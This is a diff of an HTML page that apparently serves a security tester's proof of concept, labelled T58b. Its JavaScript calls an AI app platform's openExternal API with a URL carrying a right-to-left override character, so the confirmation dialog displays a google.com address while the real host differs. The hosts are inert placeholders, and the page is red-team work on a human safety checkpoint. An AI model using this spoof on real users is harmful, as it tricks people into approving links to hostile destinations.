@@ -1,52 +1,45 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>T58</title>
+<html><head><meta charset="utf-8"><title>T58b</title>
 <style>body{font:14px Menlo,monospace;background:#111;color:#ddd;max-width:900px;margin:40px auto;padding:0 16px}
 pre{background:#1b1b1b;border:1px solid #333;border-radius:8px;padding:16px;white-space:pre-wrap;word-break:break-all}
 button{font:16px Menlo,monospace;background:#ff5252;color:#fff;border:none;border-radius:6px;padding:10px 18px;cursor:pointer;margin:8px 0}
 button:hover{background:#ff7a7a}</style></head>
 <body>
-<h2>T58 CLEAN COPY PAGE</h2>
+<h2>T58B CLEAN COPY PAGE</h2>
 <p>Copy the whole payload below (or click the button), paste into the playground, run once.</p>
 <button onclick="navigator.clipboard.writeText(document.getElementById(&quot;code&quot;).textContent).then(function(){this.textContent=&quot;COPIED - paste into playground&quot;;}.bind(this))">Copy code</button>
-<pre id="code">// T58 - BIDI DISPLAY SPOOF of the openExternal confirmation dialog
-// (Pluto Security, inert: the destination host pluto-bidi.example is
-// unregistered - nothing loads; DO NOT click Open link - no need).
-// Craft: the URL contains RIGHT-TO-LEFT OVERRIDE (U+202E, written in
-// source as the escape &quot;\u202E&quot; so the editor copy stays clean).
-// Offline-verified with the Unicode bidi algorithm (python-bidi):
-//   raw URL  = https://[RLO]@pluto-bidi.example/x/moc.elgoog.www
-//   DISPLAY  = https://www.google.com/x/elpmaxe.idib-otulp@
-//   browser  = pluto-bidi.example (new URL() verified)
-// The machine gate should still say DIALOG (unknown host) - the test
-// is what the dialog TEXT shows to the human: if it renders the bidi
-// override, the human reads &quot;https://www.google.com/...&quot; first while
-// the browser would open a different host. Same human-checkpoint
-// weakness family as the T51 homoglyph finding, stronger weapon.
+<pre id="code">// T58b - CLEAN BIDI DISPLAY SPOOF (inert; do NOT click Open - the
+// destination host &quot;hcraes&quot; is unregistered, nothing loads).
+// Offline-verified (python-bidi, deterministic): the raw URL
+//   https://[RLO]1=knil@hcraes/moc.elgoog.www
+// displays as
+//   https://www.google.com/search@link=1
+// - a completely normal-looking URL - while new URL() parses the
+// host as &quot;hcraes&quot; (verified). Same dialog, same viewer session.
 (function () {
-  var URL_T58 = &quot;https://\u202E@pluto-bidi.example/x/moc.elgoog.www&quot;;
+  var URL_T58B = &quot;https://\u202E1=knil@hcraes/moc.elgoog.www&quot;;
 
   var d = document;
   var box = d.createElement(&quot;div&quot;);
-  box.id = &quot;t58-box&quot;;
+  box.id = &quot;t58b-box&quot;;
   box.style.cssText = &quot;position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;white-space:pre-wrap&quot;;
-  box.textContent = &quot;T58 BIDI (inert) - firing in 1s. When the dialog appears: READ what it shows. Do NOT click Open.&quot;;
+  box.textContent = &quot;T58b CLEAN BIDI (inert) - firing in 1s. Dialog: read it, do NOT click Open.&quot;;
   d.body.appendChild(box);
 
   setTimeout(function () {
     var api = window.oai || window.openai || window.webplus;
     if (!api || !api.openExternal) {
-      box.textContent = &quot;T58: no oai.openExternal API found&quot;;
+      box.textContent = &quot;T58b: no oai.openExternal API found&quot;;
       return;
     }
     try {
-      api.openExternal({ href: URL_T58 });
+      api.openExternal({ href: URL_T58B });
       box.textContent =
-        &quot;T58 FIRED (inert).\n\nREAD THE DIALOG TEXT:\n&quot; +
-        &quot;- starts with https://www.google.com/... = DISPLAY SPOOF CONFIRMED\n&quot; +
-        &quot;- shows weird raw/mirrored text or %E2%80%AE = dialog blocks bidi\n&quot; +
-        &quot;real destination is pluto-bidi.example (inert, do not click Open)&quot;;
+        &quot;T58b FIRED (inert). Expected dialog text:\n&quot; +
+        &quot;https://www.google.com/search@link=1\n&quot; +
+        &quot;Real destination: hcraes (inert). Do not click Open.&quot;;
     } catch (e) {
-      box.textContent = &quot;T58 threw: &quot; + e;
+      box.textContent = &quot;T58b threw: &quot; + e;
     }
   }, 1000);
 })();
